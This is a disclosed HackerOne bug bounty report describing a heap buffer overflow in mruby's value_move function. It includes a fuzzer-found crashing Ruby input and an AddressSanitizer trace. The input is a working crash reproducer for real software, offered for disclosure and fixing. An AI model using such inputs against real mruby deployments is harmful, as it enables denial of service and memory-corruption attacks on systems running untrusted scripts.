# [M] Heap buffer overflow in mruby value_move

## Summary
Severity: Medium
Program: shopify-scripts
Weakness: Memory Corruption - Generic
Reporter: sukhoi
State: resolved
Disclosed: 2017-04-13T21:11:49.474Z
Source: https://hackerone.com/reports/209765

## Details
Hi:

The following program demonstrates heap overflow on current up-to-date master branch mruby at the time of report, `Latest commit 8b089c0`

Program lead to crash is 
```
d 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 < 0 - 0.-- 1
```
ASAN stacktrace:
```
➜  mrubyfuzz ./mruby ./testcase.rb
=================================================================
==34183==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61d00001e880 at pc 0x0000004a33ad bp 0x7ffcfe3e1bd0 sp 0x7ffcfe3e1380
WRITE of size 16 at 0x61d00001e880 thread T0
    #0 0x4a33ac in __asan_memcpy (/media/hdd/mrubyfuzz/mruby+0x4a33ac)
    #1 0x58e729 in value_move /media/hdd/mruby/src/value_array.h:14:15
    #2 0x58e729 in mrb_vm_exec /media/hdd/mruby/src/vm.c:1200
    #3 0x59f2fa in mrb_vm_run /media/hdd/mruby/src/vm.c:815:10
    #4 0x59f2fa in mrb_top_run /media/hdd/mruby/src/vm.c:2573
    #5 0x60f364 in mrb_load_exec /media/hdd/mruby/mrbgems/mruby-compiler/core/parse.y:5759:7
    #6 0x4ebafd in main /media/hdd/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
    #7 0x7fea8386182f in __libc_start_main /build/glibc-Qz8a69/glibc-2.23/csu/../csu/libc-start.c:291
    #8 0x419578 in _start (/media/hdd/mrubyfuzz/mruby+0x419578)

0x61d00001e880 is located 0 bytes to the right of 2048-byte region [0x61d00001e080,0x61d00001e880)
allocated by thread T0 here:
    #0 0x4b9a28 in realloc (/media/hdd/mrubyfuzz/mruby+0x4b9a28)
    #1 0x54c1bd in mrb_default_allocf /media/hdd/mruby/src/state.c:60:12

SUMMARY: AddressSanitizer: heap-buffer-overflow (/media/hdd/mrubyfuzz/mruby+0x4a33ac) in __asan_memcpy
Shadow bytes around the buggy address:
  0x0c3a7fffbcc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbcd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbce0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbcf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbd00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c3a7fffbd10:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/209765_
